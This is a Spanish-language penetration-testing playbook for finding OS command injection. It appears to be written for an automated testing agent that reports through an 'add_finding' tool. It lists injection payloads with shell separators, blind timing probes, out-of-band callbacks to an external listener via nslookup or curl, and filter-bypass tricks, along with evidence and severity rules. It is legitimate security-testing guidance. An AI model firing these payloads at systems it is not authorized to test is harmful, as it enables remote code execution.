# Playbook: OS Command Injection

RCE directo — máxima prioridad cuando aparece un candidato.

1. **Puntos de entrada típicos**: cualquier funcionalidad que huela a invocar un
   binario del sistema — ping/traceroute integrados, conversores de archivo
   (imagen/PDF/video), exportadores, integraciones con `git`, herramientas de
   red embebidas en un panel de admin.
2. **Detección con separadores**: probar `;`, `|`, `&&`, `` ` `` `` ` ``,
   `$(comando)`, `%0a` (newline) agregados al valor esperado. Ejemplo sobre un
   campo de "host a pingear": `127.0.0.1; id` o `127.0.0.1 && id`.
3. **Blind con timing** (si no hay eco visible): `; sleep 5` / `| sleep 5` /
   `$(sleep 5)` y medir el delta real de respuesta — repetir 2 veces para
   descartar latencia de red normal.
4. **Blind con OOB** (más confiable que timing si hay red de salida): `;
   nslookup <subdominio-unico>.interactsh.com` o `curl http://<host-propio>/cmdi-confirmado`
   — un hit en tu listener confirma sin ambigüedad.
5. **Confirmación con PoC no destructivo**: una vez confirmado, ejecutar `id` o
   `whoami` (nunca algo destructivo) y mostrar el output como evidencia.
6. **Bypasses si hay filtro de caracteres**: variables de entorno para ofuscar
   (`${IFS}` en vez de espacio), concatenación (`w'h'o'am'i`), encoding.

**Evidencia mínima para `add_finding`:** el payload exacto, y (a) el output del
comando ejecutado (`id`/`whoami`), o (b) el callback OOB recibido, o (c) el delta
de tiempo medido en al menos 2 repeticiones consistentes.

**Criterio de severidad:** critical siempre que se confirme ejecución de comandos
(el impacto es total por definición); no hay "medium" real acá — si está confirmado,
es critical. Si es solo un candidato sin confirmar, `potential`, no crítico todavía.
